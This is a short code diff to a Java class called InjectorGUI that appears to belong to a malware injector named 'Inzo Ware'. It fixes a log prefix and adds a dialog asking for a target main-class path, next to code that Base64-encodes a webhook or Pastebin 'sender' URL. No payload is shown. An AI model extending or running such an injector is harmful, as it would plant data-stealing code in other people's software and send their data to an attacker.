@@ -92,7 +92,22 @@ public class InjectorGUI{
         
         String SenderURL = URLlist;
         String encodedSenderURL = Base64.getEncoder().encodeToString(SenderURL.getBytes());
-        System.out.println((pastebinurl ? "[INFO] PasteBin URL" : "INFO] Webhook") + ": " + encodedSenderURL);
+        System.out.println((pastebinurl ? "[INFO] PasteBin URL" : "[INFO] Webhook") + ": " + encodedSenderURL);
+
+        /*--- Query options ---*/
+        String MainClass;
+
+        MainClass = (String)JOptionPane.showInputDialog(
+                null,
+                "Path To The Main Class:",
+                "Inzo Ware Injector",
+                JOptionPane.PLAIN_MESSAGE,
+                null,
+                null,
+                ""
+        );
+
+        System.out.println("[INFO] The Path Of The Main Class Is: " + MainClass);
 
     }
 
